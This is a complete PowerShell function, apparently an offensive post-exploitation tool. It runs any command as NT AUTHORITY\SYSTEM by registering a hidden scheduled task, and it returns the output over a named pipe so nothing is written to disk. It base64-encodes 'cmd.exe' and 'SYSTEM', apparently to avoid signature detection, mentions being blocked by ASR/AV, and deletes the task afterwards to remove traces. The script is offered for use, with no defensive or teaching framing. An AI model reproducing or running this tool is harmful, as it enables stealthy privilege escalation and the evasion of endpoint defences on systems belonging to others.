function Invoke-Elevate {
    <#
    .SYNOPSIS
        Executes a command as NT AUTHORITY\SYSTEM using a Named Pipe for memory-only output capture.
    .DESCRIPTION
        Creates a temporary scheduled task running as SYSTEM. Redirects output to a local Named Pipe
        to avoid writing sensitive data to the disk.
    .PARAMETER Command
        The command string to execute (e.g., 'whoami /all').
    .EXAMPLE
        Invoke-Elevate -Command "netstat -ano"
    .NOTES
        Author: destinyoo.com
        Tested on: Windows 11 (Latest)
    #>
    param(
        [Parameter(Mandatory=$true, HelpMessage="Enter the command to run as SYSTEM")]
        [Alias('c')]
        [string]$Command
    )

    if ($Command -eq "-h" -or $Command -eq "--help") {
        Get-Help Invoke-Elevate
        return
    }

    # --- Initialization ---
    $B64_CMD = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y21kLmV4ZQ=="))
    $B64_SYS = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1lTVEVN"))
    $UID = Get-Random -Maximum 9999
    $PipeName = "Global\SvcStream_$UID"
    $TaskName = "SysTask_$UID"

    Write-Host "[*] Session ID: $UID"
    Write-Host "[*] Target Principal: $B64_SYS"
    Write-Host "[*] Command Payload: $Command"

    # --- Step 1: Create Pipe Server ---
    try {
        Write-Host "[*] Initializing Named Pipe Server: \\.\pipe\$PipeName"
        $PipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName, [System.IO.Pipes.PipeDirection]::In, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::Asynchronous)
        Write-Host "[+] Pipe server established and listening."
    } catch {
        Write-Host "[-] Failed to initialize pipe: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    try {
        # --- Step 2: Define Task Action & Principal ---
        Write-Host "[*] Building Scheduled Task object..."
        $FullArg = "/c $Command > \\.\pipe\$PipeName 2>&1"
        $Action = New-ScheduledTaskAction -Execute $B64_CMD -Argument $FullArg
        $Principal = New-ScheduledTaskPrincipal -UserId $B64_SYS -LogonType ServiceAccount -RunLevel Highest
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        $TaskObj = New-ScheduledTask -Action $Action -Principal $Principal -Settings $Settings

        # --- Step 3: Registration ---
        Write-Host "[*] Registering task '$TaskName' in Task Scheduler..."
        Register-ScheduledTask -TaskName $TaskName -InputObject $TaskObj -Force | Out-Null
        Write-Host "[+] Task registered successfully."

        # --- Step 4: Execution & Stream Capture ---
        Write-Host "[*] Triggering task execution..."
        Start-ScheduledTask -TaskName $TaskName

        Write-Host "[*] Awaiting connection from SYSTEM process..."
        $AsyncResult = $PipeServer.BeginWaitForConnection($null, $null)

        # 7 second wait for the SYSTEM process to bridge the pipe
        if ($AsyncResult.AsyncWaitHandle.WaitOne(7000)) {
            $PipeServer.EndWaitForConnection($AsyncResult)
            Write-Host "[+] Connection received. Streaming output:`n" -ForegroundColor Cyan

            $Reader = New-Object System.IO.StreamReader($PipeServer)
            while (!$Reader.EndOfStream) {
                Write-Host $Reader.ReadLine()
            }
            Write-Host "`n[+] Stream closed by remote process." -ForegroundColor Cyan
        } else {
            Write-Host "[-] Timeout: The SYSTEM process did not connect to the pipe." -ForegroundColor Yellow
            Write-Host "[-] Potential cause: Command failed to start or blocked by ASR/AV."
        }

    } catch {
        Write-Host "[-] Critical Error during execution: $($_.Exception.Message)" -ForegroundColor Red
    } finally {
        # --- Step 5: Cleanup ---
        Write-Host "[*] Commencing cleanup..."
        if ($PipeServer) { $PipeServer.Dispose(); Write-Host "[+] Pipe disposed." }

        $CheckTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($CheckTask) {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
            Write-Host "[+] Scheduled task '$TaskName' removed from system."
        }
        Write-Host "[*] Cleanup complete."
    }
}
